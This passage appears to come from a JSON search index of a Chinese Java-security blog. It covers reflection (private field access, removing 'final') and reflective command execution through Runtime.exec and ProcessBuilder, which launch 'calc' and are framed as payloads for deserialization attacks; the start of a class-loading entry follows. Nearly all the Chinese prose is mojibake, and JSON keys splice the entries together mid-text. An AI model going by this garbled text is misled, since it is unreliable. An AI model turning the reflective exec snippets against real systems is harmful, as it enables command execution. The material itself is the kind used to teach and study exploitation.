getFields()ï¼šè·å–æ‰€æœ‰publicçš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ Field[] getDeclaredFields()ï¼šè·å–å½“å‰ç±»çš„æ‰€æœ‰fieldï¼Œmodifiersä¸é™ï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ è€Œä¸€ä¸ªFieldå¯¹è±¡åŒ…å«äº†ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ç”¨å¦‚ä¸‹æ–¹æ³•æŸ¥çœ‹ï¼š\ngetName()ï¼šè¿”å›å­—æ®µåç§° getType()ï¼šè¿”å›å­—æ®µç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ getModifiers()ï¼šè¿”å›å­—æ®µä¿®é¥°ç¬¦ demoå¦‚ä¸‹ï¼š\npublic class TemporaryFiles{ public static void main(String[] args) throws Exception{ Class stdClass = Student.class;//è·å–Studentç±»å®ä¾‹ System.out.println(stdClass.getField(\u0026#34;score\u0026#34;));//è·å–è¯¥ç±»çš„publicå­—æ®µ\u0026#34;score\u0026#34; System.out.println(stdClass.getField(\u0026#34;name\u0026#34;));//è·å–è¯¥ç±»ç»§æ‰¿çš„å­—æ®µ\u0026#34;name\u0026#34; System.out.println(stdClass.getDeclaredField(\u0026#34;grade\u0026#34;));//è·å–è¯¥ç±»çš„privateå­—æ®µ\u0026#34;grade\u0026#34; } } class Student extends Person{ public int score = 100; private int grade = 6; } class Person{ public String name = \u0026#34;Yuy0ung\u0026#34;; } 2.è·å–å­—æ®µå€¼ get(obj):è·å–å­—æ®µå€¼ï¼Œæ ¼å¼ä¸ºname.get(obj)ï¼Œå‚æ•°æ˜¯è¯¥ç±»çš„å¯¹è±¡ï¼ˆéœ€è¦æŠŠç±»å®ä¾‹åŒ–ï¼‰è€Œä¸æ˜¯.class æ¯”å¦‚è·å–ä¸Šæ–‡demoä¸­Studentç±»çš„nameå­—æ®µå€¼ï¼š\nåˆ›å»ºFieldéœ€è¦å¯¼åŒ…ï¼š\nimport java.lang.reflect.Field;\t//åˆ›å»ºFieldéœ€è¦å¯¼åŒ… æ¥ä¸‹æ¥è·å–å¹¶è¾“å‡ºï¼š\nClass stdClass = Student.class;//è·å–Studentç±»å®ä¾‹ Field name = stdClass.getField(\u0026#34;name\u0026#34;);//åˆ›å»ºfieldè·å¾—nameå€¼ System.out.println(name.get(stdClass.newInstance()));//è¾“å‡º ä¹Ÿå¯ä»¥ä¸€æ¬¡æ€§ç›´æ¥è¾“å‡ºï¼ˆæ— éœ€å¯¼åŒ…ï¼‰ï¼š\nClass stdClass = Student.class;//è·å–Studentç±»å®ä¾‹ System.out.println(stdClass.getField(\u0026#34;name\u0026#34;).get(stdClass.newInstance()));//ç›´æ¥è¾“å‡º ç›´æ¥è·å–privateç±»å‹çš„gradeå­—æ®µä¼šæŠ›å‡ºä¸€ä¸ªIllegalAccessExceptionçš„é”™è¯¯ï¼š\néœ€è¦å…ˆä½¿ç”¨Field.setAccessible(true):\nClass stdClass = Student.class;//è·å–Studentç±»å®ä¾‹ Field grade = stdClass.getDeclaredField(\u0026#34;grade\u0026#34;); grade.setAccessible(true); System.out.println(grade.get(stdClass.newInstance())); 3.ä¿®æ”¹/è®¾ç½®å­—æ®µå€¼ setï¼šä¿®æ”¹/è®¾ç½®å­—æ®µå€¼ ä»¥è®¾ç½®ä¸Šæ–‡demoä¸­gradeå€¼ä¸ºä¾‹ï¼š\nimport java.lang.reflect.*; public class TemporaryFiles{ public static void main(String[] args) throws Exception{ Class std = Student.class;//è·å–Studentç±»å®ä¾‹ Student student = new Student();//å…ˆå®ä¾‹åŒ– Field f = std.getDeclaredField(\u0026#34;grade\u0026#34;);//è®°å¾—å¯¼åŒ… f.setAccessible(true);//ä¿®æ”¹épublicå­—æ®µï¼Œéœ€è¦é¦–å…ˆè°ƒç”¨setAccessible(true) f.set(student,666);//å°†stdçš„gradeå€¼è®¾ç½®ä¸º666 System.out.println(f.get(student));//è¾“å‡ºgradeçš„å€¼ } } class Student extends Person { public int score; private int grade; } class Person{ public String name = \u0026#34;Yuy0ung\u0026#34;; } 4.åå°„ä¿®æ”¹è¢«finalå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å˜é‡ å…ˆä¿®æ”¹modifiers\n// åå°„è·å–Fieldç±»çš„modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // è®¾ç½®modifiersä¿®æ”¹æƒé™ modifiers.setAccessible(true); // ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼ modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // ä¿®æ”¹æˆå‘˜å˜é‡å€¼ field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼); æ¯”å¦‚ä¸‹é¢çš„demoï¼š\nimport java.lang.reflect.Field; import java.lang.reflect.Modifier; public class TemporaryFiles { public static void main(String[] args) throws Exception { Class cls = Class.forName(\u0026#34;Yuy0ung\u0026#34;); Yuy0ung yuy0ung = new Yuy0ung(); Field field = cls.getDeclaredField(\u0026#34;team\u0026#34;); Field modifiers = Field.class.getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiers.setAccessible(true);//è·å–è®¿é—®æƒé™ modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // æ¸…é™¤ final ä¿®é¥°ç¬¦ field.setAccessible(true); // æ·»åŠ æ­¤è¡Œä»¥ä½¿ç§æœ‰å­—æ®µå¯è®¿é—® field.set(yuy0ung, \u0026#34;W4ntY0u\u0026#34;);//ä¿®æ”¹teamå­—æ®µä¸º\u0026#34;W4ntY0u\u0026#34; System.out.println(field.get(yuy0ung));//è¾“å‡ºteamå­—æ®µ } } class Yuy0ung { final String team = \u0026#34;D0g3\u0026#34;; } è·å–æ„é€ æ–¹æ³• Javaçš„åå°„APIæä¾›äº†Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚\né€šè¿‡Classå®ä¾‹è·å–Constructorçš„æ–¹æ³•å’Œä¸Šé¢è·å–æ–¹æ³•ç±»ä¼¼ï¼Œå¦‚ä¸‹ï¼š\ngetConstructor(Class...)ï¼šè·å–æŸä¸ªpublicçš„Constructorï¼› getDeclaredConstructor(Class...)ï¼šè·å–æŸä¸ªConstructorï¼› getConstructors()ï¼šè·å–æ‰€æœ‰publicçš„Constructorï¼› getDeclaredConstructors()ï¼šè·å–æ‰€æœ‰Constructorã€‚ è°ƒç”¨épublicçš„Constructoræ—¶ï¼Œå¿…é¡»é¦–å…ˆé€šè¿‡setAccessible(true)è®¾ç½®å…è®¸è®¿é—®ï¼ˆsetAccessible(true)å¯èƒ½ä¼šå¤±è´¥ï¼‰\nè·å–ç»§æ‰¿å…³ç³» è·å–çˆ¶ç±»\nClass.getSuperclass() è·å–interface\nClass.getInterface() åˆ©ç”¨åå°„å‘½ä»¤æ‰§è¡Œ Runtime é¦–å…ˆäº†è§£æ­£å¸¸æƒ…å†µçš„å‘½ä»¤æ‰§è¡Œï¼š\npublic class cmd { public static void main(String[] args) throws Exception { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } //æ‰§è¡Œåï¼Œç³»ç»Ÿä¼šæ‰“å¼€è®¡ç®—æœº java.lang.Runtime å› ä¸ºæœ‰ä¸€ä¸ª exec æ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤:\nå½“æˆ‘ä»¬ç›´æ¥å°è¯•ä½¿ç”¨.newInstance()è°ƒç”¨Runtimeçš„æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¼šäº§ç”ŸæŠ¥é”™ï¼ŒnewInstance()å¤±è´¥çš„åŸå› é€šå¸¸æœ‰ä¸¤ç§ï¼š\nä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ è€Œè¿™é‡Œçš„åŸå› æ˜¯ Runtime ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„\nä½†Runtime.execæ–¹æ³•æœ‰å…­ä¸ªé‡è½½ï¼Œè€Œè¿™é‡Œä½¿ç”¨exec(String commmand)æ–¹æ³•å³å¯å®ç°å‘½ä»¤æ‰§è¡Œæ¯”å¦‚exec(\u0026quot;calc\u0026quot;)\nè€ŒRuntimeç±»æœ‰ä¸€ä¸ªgetRuntimeæ–¹æ³•ï¼Œä¸”è¿™ä¸ªæ–¹æ³•æ˜¯å…¬æœ‰çš„ï¼š\npublic Static Runtime getRuntime() { return currentRuntime; } è¯¥æ–¹æ³•å¯ä»¥è·å–Runtimeå¯¹è±¡\nç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªåå°„å®ç°å‘½ä»¤æ‰§è¡Œçš„æ€è·¯;\nåœ¨è·å–Runtimeç±»å®ä¾‹åï¼Œé€šè¿‡getMethod(\u0026quot;exec\u0026quot;,String.Class)è·å–execæ–¹æ³• é€šè¿‡Runtime.getRuntimeè·å–Runtimeå¯¹è±¡ æ‰§è¡ŒRuntime.execæ–¹æ³• å®ç°çš„ä»£ç å¦‚ä¸‹ï¼š\nimport java.lang.reflect.*; public class cmd { public static void main(String[] args) throws Exception { Class Runtime = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);//è·å¾—Runtimeç±»å®ä¾‹ Method exec = Runtime.getMethod(\u0026#34;exec\u0026#34;, String.class);//è·å¾—execæ–¹æ³• Method getRuntime = Runtime.getMethod(\u0026#34;getRuntime\u0026#34;);//è·å¾—getRuntimeæ–¹æ³• Object runtime = getRuntime.invoke(Runtime);//è°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹å¯¹è±¡ exec.invoke(runtime, \u0026#34;calc\u0026#34;);//è°ƒç”¨execæ–¹æ³• } } æ•´åˆä¸€ä¸‹ï¼Œå¯ä»¥ä¸ç”¨å¯¼åŒ…\npublic class cmd { public static void main(String[] args) throws Exception { Class Runtime = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Runtime.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(Runtime.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(Runtime), \u0026#34;calc\u0026#34;); } } ä¹Ÿå¯ä»¥åˆ©ç”¨getConstructor()è·å–æ„é€ å‡½æ•°ï¼Œå¹¶ä½¿ç”¨newInstance()æ‰§è¡Œï¼Œå®ç°å®ä¾‹åŒ–\ndemoå¦‚ä¸‹ï¼Œå› ä¸ºRuntimeæ„é€ å™¨æ˜¯Privateï¼Œæ‰€ä»¥éœ€è¦setAccessible(true)å®ç°æš´åŠ›è®¿é—®æƒé™ï¼š\nimport java.lang.reflect.Constructor; public class cmd { public static void main(String[] args) throws Exception { Class Runtime = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);//è·å¾—Runtimeç±»å®ä¾‹ Constructor constructor = Runtime.getDeclaredConstructor();//è·å–æ„é€ å™¨ constructor.setAccessible(true);//æš´åŠ›è®¿é—®æƒé™ Runtime.getMethod(\u0026#34;exec\u0026#34;,String.class).invoke(constructor.newInstance(),\u0026#34;calc\u0026#34;);//è°ƒç”¨æ„é€ å™¨çš„newInstanceå®ç°å®ä¾‹åŒ– } } //å¼¹å‡ºè®¡ç®—æœº ProcessBuilder ProcessBuilderä¹Ÿæ˜¯ä¸€ç§å¸¸ç”¨çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼\nå…¶æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š\npublic ProcessBuilder(List\u0026lt;String\u0026gt; command) { if(command == null) throw new NullPointerException(); this.command = command; } public ProcessBuilder(String... command) { this.cammand = new ArrayList\u0026lt;\u0026gt;(command.length); for(String arg : command) this.command.add(arg); } ç¬¬ä¸€ç§æ„é€ å‡½æ•°çš„åˆ©ç”¨ å¯ä»¥ä½¿ç”¨åå°„æ¥è·å–å…¶ç¬¬ä¸€ç§æ„é€ å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nåœ¨getConstructorä¼ å…¥List.classè·å–ç¬¬ä¸€ç§æ„é€ å‡½æ•°ï¼Œç„¶åè·å–å¹¶è°ƒç”¨start() æ¥æ‰§è¡Œå‘½ä»¤ï¼š\nimport java.util.Arrays; import java.util.List; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class cmd { public static void main(String[] args) throws Exception { Class psb = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor = psb.getConstructor(List.class); Object obj = constructor.newInstance(Arrays.asList(\u0026#34;calc\u0026#34;));//æ‰§è¡Œçš„å‘½ä»¤æ˜¯æ‰“å¼€è®¡ç®—å™¨ Method start = psb.getMethod(\u0026#34;start\u0026#34;);//è·å–startç”¨äºå¯åŠ¨è¿›ç¨‹ start.invoke(obj);//è°ƒç”¨startå¯åŠ¨è¿›ç¨‹ï¼Œå³æ‰“å¼€è®¡ç®—å™¨ } } æ•´åˆä¸€ä¸‹ï¼š\nimport java.util.Arrays; import java.util.List; public class cmd { public static void main(String[] args) throws Exception { Class psb = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); psb.getMethod(\u0026#34;start\u0026#34;).invoke(psb.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc\u0026#34;))); } } ç¬¬äºŒç§æ„é€ å‡½æ•°çš„åˆ©ç”¨ ä¹Ÿå¯ä»¥åˆ©ç”¨ç¬¬äºŒç§å½¢å¼çš„æ„é€ å‡½æ•°ï¼Œå¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaå…¶å®åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ä¸‹è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚æ˜¯ç­‰ä»·çš„ï¼š\npublic void hello(String[] names) {} public void hello(String...names) {} æ¢å¥è¯è¯´ï¼Œå¯¹äºåå°„è€Œè¨€ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œå…¶å®æˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯æ•°ç»„å°±è¡Œäº†\nå¯ä»¥å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±»String[].classä¼ ç»™getConstructorï¼Œè·å–ProcessBuilderçš„ç¬¬äºŒç§æ„é€ å‡½æ•°ï¼Œåœ¨è°ƒç”¨ newInstance çš„æ—¶å€™ï¼Œå› ä¸ºè¿™ä¸ªæ„é€ å‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°å³æ•°ç»„ï¼Œä¼ ç»™ ProcessBuilderçš„æ˜¯ä¸€ä¸ªList\u0026lt;String\u0026gt;ç±»å‹ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„\næ“æ“payloadï¼š\nimport java.lang.reflect.Constructor; import java.lang.reflect.Method; public class cmd { public static void main(String[] args) throws Exception { Class psb = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor = psb.getConstructor(String[].class); Object obj = constructor.newInstance(new String[][]{{\u0026#34;calc\u0026#34;}}); Method method = psb.getMethod(\u0026#34;start\u0026#34;); method.invoke(obj); } } æ•´åˆä¸€ä¸‹ï¼š\npublic class cmd { public static void main(String[] args) throws Exception { Class psb = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); psb.getMethod(\u0026#34;start\u0026#34;).invoke(psb.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc\u0026#34;}})); } } åå°„åœ¨ååºåˆ—åŒ–ä¸­çš„è¿ç”¨ ä¿®æ”¹å¯¹è±¡ä¸ºæˆ‘ä»¬éœ€è¦çš„æ¡ä»¶ é€šè¿‡invokeè°ƒç”¨é™¤äº†åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•° é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±» ",
        "summary": "javaå®‰å…¨åŸºç¡€-åå°„ æ¦‚å¿µ Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§)ï¼Œè¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½å°±ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚\nPç¥æ˜¯è¿™æ ·æè¿°çš„ï¼šâ€œåå°„æ˜¯å¤§å¤šæ•°è¯­è¨€é‡Œéƒ½å¿…ä¸å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚â¼€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§ã€‚â€\nåå°„çš„å®ç° JVMä¸ºæ¯ä¸ªåŠ è½½çš„classåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼›å› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯\nä¸åå°„æœ‰å…³çš„åŒ…/ç±» ä¸åå°„æœ‰å…³çš„åŒ… å¼•å…¥ä¸åå°„æœ‰å…³çš„åŒ…\nimport java.lang.reflect.*; åå°„ä¸­æ¯”è¾ƒé‡è¦çš„ç±» java.lang.Class\nè¿™ä¸ªç±»ä»£è¡¨ç€å­—èŠ‚ç ï¼Œæ•´ä¸ªç±»\njava.lang.reflect.Method\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æˆå‘˜æ–¹æ³•\njava.lang.reflect.Constructor\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æ„é€ æ–¹æ³•\njava.lang.reflect.Field\nä»£è¡¨å­—èŠ‚ç  (ç±») ä¸­çš„æˆå‘˜å˜é‡\nè°ƒç”¨æ–¹æ³• æ¬²è¦è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„ä»»æ„æ–¹æ³•ï¼Œæœ‰ä¸‰æ­¥ï¼š\nè·å¾—è¯¥å¯¹è±¡å¯¹åº”çš„Classç±»çš„å®ä¾‹ é€šè¿‡è¯¥Classç±»çš„å®ä¾‹æ¥è·å–æ¬²è¦è°ƒç”¨çš„é‚£ä¸ªæ–¹æ³• æ‹¿åˆ°å¯¹åº”æ–¹æ³•åï¼Œç»™è¯¥æ–¹æ³•ä¼ å…¥å¯¹åº”å‚æ•°è¿›è¡Œè°ƒç”¨ æ¥ä¸‹æ¥æ˜¯å…·ä½“çš„å®ç°æµç¨‹ï¼Œä»¥å¦‚ä¸‹Userç±»çš„setName()æ–¹æ³•ä¸ºä¾‹ï¼š\npublic class User{ private String name; private int age; @Override public String toString(){ return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#34; +name + \u0026#34;, age=\u0026#34;+age+\u0026#34;}\u0026#34;; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 1.è·å¾—ç±»å®ä¾‹ æ–¹æ³•æœ‰ä¸‰ï¼š\n"
    }
,
    {
        "title": "javaå®‰å…¨åŸºç¡€-ç±»åŠ è½½",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E7%B1%BB%E5%8A%A0%E8%BD%BD/",
        "content": "javaå®‰å…¨åŸºç¡€-ç±»åŠ è½½ ç®€ä»‹ Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œjavaè™šæ‹Ÿæœºï¼ˆJVMï¼‰æŠŠæè¿°ç±»æ–‡ä»¶çš„æ•°æ®ä».classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è½¬æ¢ã€è§£æå’Œç±»åˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«JVMä½¿ç”¨çš„javaç±»å‹ï¼Œä¸Šè¿°è¿‡ç¨‹ä¸­JVMçš„æ“ä½œè¢«ç§°ä¸ºJVMçš„ç±»åŠ è½½æœºåˆ¶\nç±»çš„ç”Ÿå‘½å‘¨æœŸ ç±»çš„ç”Ÿå‘½å‘¨æœŸï¼Œæ˜¯ä»åŠ è½½åˆ° JVM å†…å­˜å¼€å§‹ï¼Œåˆ°å¸è½½å‡º JVM å†…å­˜ç»“æŸ\næ•´ä¸ªç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ï¼šåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ã€ä½¿ç”¨ã€å¸è½½\nè€ŒéªŒè¯ã€å‡†å¤‡ã€è§£æä¸‰ä¸ªè¿‡ç¨‹åˆç§°ä¸ºè¿æ¥\nåŠ è½½ åŠ è½½å³æŸ¥æ‰¾å¹¶åŠ è½½ç±»çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œjvmåšäº†ä¸‰ä»¶äº‹ï¼š\né€šè¿‡ç±»çš„å…¨é™å®šåï¼ˆåŒ…å + ç±»åï¼‰æ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ å°†è¯¥å­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºè¿è¡Œæ—¶çš„æ•°æ®ç»“æ„ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥é—¨ æ³¨ï¼š è¿æ¥é˜¶æ®µçš„éƒ¨åˆ†è¡Œä¸ºä¼šä¸åŠ è½½é˜¶æ®µäº¤å‰è¿›è¡Œï¼Œä¾‹å¦‚ï¼šåœ¨åŠ è½½å°šæœªç»“æŸæ—¶ï¼Œå°±å¯ä»¥å¯¹åŠ è½½æˆåŠŸçš„éƒ¨åˆ†äºŒè¿›åˆ¶æµè¿›è¡Œæ–‡ä»¶æ ¼å¼éªŒè¯\néªŒè¯ ç¡®ä¿è¢«åŠ è½½ç±»çš„æ­£ç¡®æ€§ï¼Œç”±äºclassæ–‡ä»¶æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œå¯ä»¥è¢«ä¿®æ”¹ï¼ŒéªŒè¯é˜¶æ®µå¯ä»¥é¿å…ä¸è§„èŒƒçš„classè¢«jvmä½¿ç”¨ï¼Œä»è€Œå±å®³jvmå®‰å…¨ï¼ŒéªŒè¯å†…å®¹å¦‚ä¸‹ï¼š\næ–‡ä»¶æ ¼å¼éªŒè¯\néªŒè¯å­—èŠ‚æµæ˜¯å¦ç¬¦åˆClassæ–‡ä»¶æ ¼å¼è§„èŒƒ\nå…ƒæ•°æ®éªŒè¯\nå¯¹å­—èŠ‚ç æè¿°çš„ä¿¡æ¯è¿›è¡Œè¯­ä¹‰åˆ†æï¼Œä»¥ä¿è¯å…¶æè¿°çš„ä¿¡æ¯ç¬¦åˆJavaè¯­è¨€è§„èŒƒè¦æ±‚\nå­—èŠ‚ç éªŒè¯\né€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµåˆ†æï¼Œç¡®å®šç¨‹åºè¯­ä¹‰æ˜¯å¦åˆæ³•ã€ç¬¦åˆé€»è¾‘\nç¬¦å·å¼•ç”¨éªŒè¯\nç¡®ä¿è§£æåŠ¨ä½œèƒ½æ­£ç¡®æ‰§è¡Œ\nå‡†å¤‡ æ­£å¼ä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼\nè¿™é‡Œçš„é»˜è®¤å€¼æ˜¯æ•°æ®ç±»å‹é»˜è®¤çš„é›¶å€¼ï¼ˆ0ã€0Lã€nullã€falseç­‰ï¼‰è€Œä¸æ˜¯ä»£ç ä¸­æ‰€åˆå§‹åŒ–çš„å€¼ï¼Œæ¯”å¦‚ï¼š\npublic static int value = 123; å‡†å¤‡é˜¶æ®µåç±»å˜é‡valueçš„å€¼æ˜¯0è€Œä¸æ˜¯123ï¼Œå› ä¸ºåœ¨å‡†å¤‡é˜¶æ®µè¿˜æ²¡æœ‰ä»»ä½•javaæ–¹æ³•è¢«æ‰§è¡Œï¼Œè€Œç»™ç±»å˜é‡èµ‹å€¼çš„æ“ä½œæ˜¯éœ€è¦è°ƒç”¨ç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•ä¸­çš„putstaticæŒ‡ä»¤çš„\nå†…å­˜åˆ†é…ä»…åŒ…æ‹¬ç±»é™æ€å˜é‡ï¼Œå®ä¾‹å˜é‡å°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åˆ°Javaå †ä¸­\nå¯¹äºåŒæ—¶è¢«staticå’Œfinalä¿®é¥°çš„å¸¸é‡ï¼Œå¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™å°±ä¸ºå…¶æ˜¾ç¤ºçš„èµ‹å€¼ï¼›åªè¢«finalä¿®é¥°çš„å¸¸é‡ï¼Œåœ¨ä½¿ç”¨å‰å¿…é¡»ä¸ºå…¶æ˜¾ç¤ºçš„èµ‹å€¼ï¼Œç³»ç»Ÿä¸ä¼šä¸ºå…¶èµ‹äºˆé»˜è®¤é›¶å€¼ï¼Œå¦åˆ™IDEAä¼šæç¤ºæœªåˆå§‹åŒ–\nè§£æ æŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ã€‚\nç¬¦å·å¼•ç”¨ï¼šå­—ç¬¦ä¸²ï¼Œèƒ½æ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²å®šä½åˆ°æŒ‡å®šçš„æ•°æ®ï¼Œæ¯”å¦‚java/lang/StringBuilder\nç›´æ¥å¼•ç”¨ï¼šå†…å­˜åœ°å€æˆ–æŒ‡å‘å¯¹åº”å†…å­˜åœ°å€çš„æŒ‡é’ˆã€å¥æŸ„\nç¬¦å·å¼•ç”¨å°±åªæ˜¯ä¸€ä¸ªå­—é¢é‡ï¼Œä¸å†…å­˜ç»“æ„æ— å…³ï¼Œä»…ä»…é€šè¿‡å­—é¢é‡æ— æ³•ç¡®è®¤è¯¥å¼•ç”¨åœ¨jvmå†…å­˜ä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ— æ³•ä½¿ç”¨å®ƒï¼Œæ‰€ä»¥å¿…é¡»è¦å°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºèƒ½å¤Ÿå®šä½åˆ°å†…å­˜åœ°å€çš„ç›´æ¥å¼•ç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦è°ƒç”¨System.out.printlnæ–¹æ³•ï¼Œæˆ‘ä»¬å¿…é¡»è¦æ‰¾åˆ°printlnæ–¹æ³•åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ï¼Œè¿™æ 